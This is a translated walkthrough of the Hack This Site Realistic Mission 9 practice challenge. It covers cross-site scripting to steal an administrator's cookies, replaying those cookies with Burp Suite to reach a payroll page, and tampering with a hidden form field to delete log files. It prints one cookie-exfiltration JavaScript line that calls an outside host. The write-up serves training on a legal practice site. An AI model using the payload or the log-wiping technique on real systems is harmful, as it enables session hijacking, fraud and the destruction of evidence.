<html>
<head>
<title>Hack This Site: Realistic Web Mission — Level 9</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑掉这个网站:现实的网络任务——第9级</h1>
<blockquote>原文：<a href="https://medium.com/geekculture/hack-this-site-realistic-web-mission-level-9-bb58a80ff69d?source=collection_archive---------11-----------------------#2021-10-06">https://medium.com/geekculture/hack-this-site-realistic-web-mission-level-9-bb58a80ff69d?source=collection_archive---------11-----------------------#2021-10-06</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/bfe875bae357693fcf30360dc334dc44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*IngCF9gKCHgNeyam"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Hack This Site: Realistic Web Mission — Level 9</figcaption></figure><p id="96a1" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">感谢你的突然出现，今天我们要看的是<a class="ae js" href="https://hackthissite.org/" rel="noopener ugc nofollow" target="_blank">黑掉这个网站</a>现实网络任务9。换句话说，我们要搞垮软件巨头蹩脚软件。当员工生产劣质软件时，它将不再勒索他们。这次任务非常有趣，完成的过程比以前的任务更加曲折。为了完成这个任务，我们将使用javascript来窃取cookies。此外，我们还必须操纵我们的cookies来访问工资系统并支付员工工资。完成后，我们必须操作一个隐藏的表单参数来删除日志文件。如果你没有看过我在现实系列上的其他帖子，你可以在这里看到:<a class="ae js" href="https://haxez.org/2021/09/hack-this-site-realistic-web-missions-level-1/" rel="noopener ugc nofollow" target="_blank">第一部分</a>、<a class="ae js" href="https://haxez.org/2021/09/hack-this-site-realistic-web-mission-level-2/" rel="noopener ugc nofollow" target="_blank">第二部分</a>、<a class="ae js" href="https://haxez.org/2021/09/hack-this-site-realistic-web-mission-level-3/" rel="noopener ugc nofollow" target="_blank">第三部分</a>、<a class="ae js" href="https://haxez.org/2021/09/hack-this-site-realistic-web-mission-level-4/" rel="noopener ugc nofollow" target="_blank">第四部分</a>、<a class="ae js" href="https://haxez.org/2021/09/hack-this-site-realistic-web-mission-level-5/" rel="noopener ugc nofollow" target="_blank">第五部分</a>、<a class="ae js" href="https://haxez.org/2021/09/hack-this-site-realistic-web-mission-level-6/" rel="noopener ugc nofollow" target="_blank">第六部分</a>、<a class="ae js" href="https://haxez.org/2021/10/hack-this-site-realistic-web-mission-level-7/" rel="noopener ugc nofollow" target="_blank">第七部分</a>和<a class="ae js" href="https://haxez.org/2021/10/hack-this-site-realistic-web-mission-level-8/" rel="noopener ugc nofollow" target="_blank">第八部分</a>。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es jt"><img src="../Images/5bd7b455a0c1968d99798cfaa19a1555.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/0*w12vnHFWzyxs5tdP"/></div><figcaption class="iq ir et er es is it bd b be z dx">Crappysoft Software</figcaption></figure><h1 id="d193" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">介绍</h1><p id="96c8" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">可以看到，我们收到了一个叫R·康纳的人发来的信息。总而言之，客户解释说，他们的老板已经停止支付他们的工资，他们的租金到期了。鉴于这几点，他们问我们是否可以侵入在线工资系统并处理他们的付款。因此，他们提供了登录凭证，希望能有所帮助。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es jt"><img src="../Images/c8ccc8f089b162bf315e9d63b32ce46f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/0*BVhxFkiCYCWByfbV"/></div><figcaption class="iq ir et er es is it bd b be z dx">Message From R Conner</figcaption></figure><h1 id="5bb4" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">探索Web应用程序</h1><p id="697d" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">该应用程序有一个相当基本的设计。值得注意的是，顶部有一个标题，左侧有一个导航菜单。此外，导航菜单包含一个到主页、邮件列表、联系人和演示的链接。邮件列表允许访问者提交他们的电子邮件地址。此外，联系表单确实如tin上所说的那样，它允许访问者发送电子邮件。演示页面允许访问者下载他们软件的演示。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/d1fa8be40dd1ae60007bcada39831142.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*Yjat2QUmuFnhcBLH"/></div><figcaption class="iq ir et er es is it bd b be z dx">Web Application</figcaption></figure><h1 id="3961" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">劫持网络Cookies</h1><p id="067d" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">客户给了我们他们的凭证，让我们登录看看发生了什么。不出所料，一旦我们登录，我们有许多新的选项。私信，发工资。单击“支付工资”链接会产生一条错误消息，提示我们需要成为管理员。不管怎样，我们需要窃取管理员的凭证。转到私人消息部分，我们可以选择向所有者/管理员发送私人消息。</p><p id="9bb8" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">为了进入管理员的账户，我们需要窃取他们的cookies。出于这个目的，我们通常需要将一个PHP脚本部署到一个远程web服务器。当然，GitHub上有很多可用的，但是部署一个超出了本演练的范围。也许在将来的某个时候。通过向我们的受害者发送以下Javascript，我们正在执行跨站点脚本攻击，该攻击窃取cookies并将它们发送到我们的恶意域。</p><pre class="ju jv jw jx fd lc ld le lf aw lg bi"><span id="9d37" class="lh jz hi ld b fi li lj l lk ll">javascript:void(window.location='https://haxez.org/stealcookies.php?'+document.cookie);</span></pre><p id="fd57" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">通过向受害者发送上述脚本，您将收到一个通知，告知您受害者的cookies。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/6650ce81d15f4f9ddc8661d836f7b36f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*SU3bBpd720EjFmhL"/></div><figcaption class="iq ir et er es is it bd b be z dx">Cross Site Scripting — Cookie Stealing</figcaption></figure><h1 id="e414" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">操纵网络Cookies</h1><p id="b609" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">现在我们有了受害者的饼干，我们可以用它们进入工资系统。为了做到这一点，我们需要直接在浏览器中修改cookies，或者使用Burp Suite这样的工具来拦截和修改它们。为了演示，下图显示了一个被拦截的对payday.php页面的请求。它显示cookie<code class="du lm ln lo ld b">strUsername</code>和<code class="du lm ln lo ld b">strPassword</code>已经被修改为从cookie窃取者漏洞中接收到的那些。转发请求。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/f82c0ee9c36a7423afc40fffb65bc7d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*-NrDzbnPBPKtwi6C"/></div><figcaption class="iq ir et er es is it bd b be z dx">Burp Suite — Request Intercepted</figcaption></figure><h1 id="d489" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">支付人员</h1><p id="8304" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">在某种程度上，直接在浏览器中修改cookies会更容易。通过Burp Suite实现这一点需要您为每个请求修改cookies。例如，我们操纵cookies来访问工资页面，但是我们需要截取并再次修改它们来提交支付按钮，如下图所示。不修改cookie将从您的浏览器发送默认的cookie，即客户端的cookie。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/85aa1a3a6467c5e11f2587942634e82f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*IJvCNYV1Epo7d6Ju"/></div><figcaption class="iq ir et er es is it bd b be z dx">Web Application — Pay Personnel</figcaption></figure><h1 id="c023" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">掩盖我们的踪迹</h1><p id="5d16" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">既然我们已经成功地将平衡带回了康纳的世界，我们需要隐藏所有我们在这里的证据。在浏览了网站一会儿之后，我发现在files目录上启用了目录列表。此外，该目录包含下载、日志和邮件列表目录。这些信息对于利用web应用程序删除日志文件来说是无价的。我们不能通过目录列表删除它们，但也许我们可以找到另一种方法。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/a3b1aa5024be0444fd8e5c4bf5f5a51e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*wc3uKIicED8R2lJe"/></div><figcaption class="iq ir et er es is it bd b be z dx">Directory Listing</figcaption></figure><p id="8ddb" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">回到申请邮件列表页面，我们可以看到一条消息。该消息说邮件列表检查列表中没有“@”符号的地址并删除它们。这似乎是一个活跃的功能，所以也许我们可以利用它。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/5d5c7a72b800a55f92f8946da67127d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*KXZYXiFtdChPniQy"/></div><figcaption class="iq ir et er es is it bd b be z dx">Web Application — Mailing List</figcaption></figure><h1 id="87af" class="jy jz hi bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">利用邮件列表</h1><p id="2853" class="pw-post-body-paragraph iu iv hi iw b ix kw iz ja jb kx jd je jf ky jh ji jj kz jl jm jn la jp jq jr hb bi translated">记住这一点，让我们查看应用程序邮件列表的源代码，并弄清楚发生了什么。我们可以从下图中看到，一个post请求被提交到subscribemailing.php页面。我们还可以设置一个隐藏的表单值来指定邮件列表的路径。有一个可见的表单，让用户包括他们的电子邮件地址。如果我们提交一个不带“@”符号的电子邮件地址，并将隐藏表单值更改为日志文件，会发生什么情况？</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/8be1eb02dc48513aac7f3b178a1e96f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*2HGnom31R7WhQ4n-"/></div><figcaption class="iq ir et er es is it bd b be z dx">Web Application — Page Source</figcaption></figure><p id="ee82" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">你可以直接通过你的浏览器的开发控制台来实现，或者像我一样通过Burp Suite来实现。使用Burp Suite可以帮助挫败一些客户端检查(比如对“@”符号的检查)。首先，您需要打开intercept，并向邮件列表填充和提交一个字符串。其次，您需要修改请求，将地址从addressess.txt文件更改为/files/logs/logs.txt文件。最后，您需要转发请求。这应该能让你完成任务。</p><figure class="ju jv jw jx fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es lb"><img src="../Images/afe86dde38b599ec48734c7b293a29b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*-0eyIO3J58cUaRrW"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Congratulations</figcaption></figure><figure class="ju jv jw jx fd ij"><div class="bz dy l di"><div class="lp lq l"/></div></figure></div></div>    
</body>
</html>